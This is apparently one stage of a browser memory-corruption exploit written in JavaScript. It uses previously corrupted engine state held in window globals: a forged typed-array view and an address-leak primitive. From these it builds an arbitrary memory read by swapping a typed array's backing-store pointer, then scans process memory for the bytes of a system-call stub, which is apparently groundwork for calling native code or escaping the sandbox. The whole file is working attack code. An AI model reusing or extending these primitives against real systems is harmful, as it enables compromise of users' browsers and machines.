// Search a bounded current-process window near the verified close wrapper
// for a number-5 open wrapper. This makes no native call.
var state = window.__fw14ArrayState;
var plan = window.__fw14NativePlan;
var result;
var slot = -1;
var original = [];
try {
  if (!state || !plan || !state.view || !state.array || !state.a ||
      !state.ownedTypedView || state.array[0] !== state.a ||
      !Number.isSafeInteger(state.calibratedViewBase))
    throw new Error("held_state_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function hexLE(bytes) {
    var out = "0x";
    for (var n = bytes.length - 1; n >= 0; n--)
      out += bytes[n].toString(16).padStart(2, "0");
    return out;
  }
  function hexForward(bytes) {
    var out = "";
    for (var n = 0; n < bytes.length; n++)
      out += bytes[n].toString(16).padStart(2, "0");
    return out;
  }
  function wordOf(value) {
    try {
      state.array[0] = value;
      return Number(hexLE(bytesAt(state.index, 8)));
    } finally {
      state.array[0] = state.a;
    }
  }
  var index = wordOf(carrier) - base;
  if (!Number.isSafeInteger(index) || index < 0 ||
      index + 15 >= 16777216)
    throw new Error("carrier_cell_outside_window");
  slot = index + 8;
  original = bytesAt(slot, 8);
  function pointerBytes(address) {
    if (!Number.isSafeInteger(address) || address <= 0)
      throw new Error("read_address_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(address / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function readAddress(address, count) {
    var next = pointerBytes(address);
    try {
      for (var n = 0; n < 8; n++) forged[slot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++) forged[slot + x] = original[x];
    }
  }
  var start = plan.target + 0x8b0;
  var expected = "48c7c0050000004989ca0f057201c348";
  var matches = [];
  for (var offset = 0; offset < 0x400; offset += 16) {
    var address = start + offset;
    var first = hexForward(readAddress(address, 16));
    if (first === expected &&
        hexForward(readAddress(address, 16)) === expected)
      matches.push("0x" + address.toString(16));
  }
  var restored = hexLE(bytesAt(slot, 8)) === hexLE(original) &&
    carrier[0] === 0x31 && carrier[7] === 0xa8 &&
    state.array[0] === state.a;
  result = { id: "sandbox_open_wrapper_scan_v1",
    status: restored ? "pass" : "fail",
    details: { start: "0x" + start.toString(16),
      bytes_scanned: 1024, matches: matches.join(","),
      expected: expected, view_restored: restored } };
} catch (error) {
  if (slot >= 0 && original.length === 8 && state && state.view)
    for (var y = 0; y < 8; y++) state.view[slot + y] = original[y];
  if (state && state.array && state.a) state.array[0] = state.a;
  result = { id: "sandbox_open_wrapper_scan_v1", status: "error",
    details: { error: String(error).slice(0, 200) } };
}
return [result];
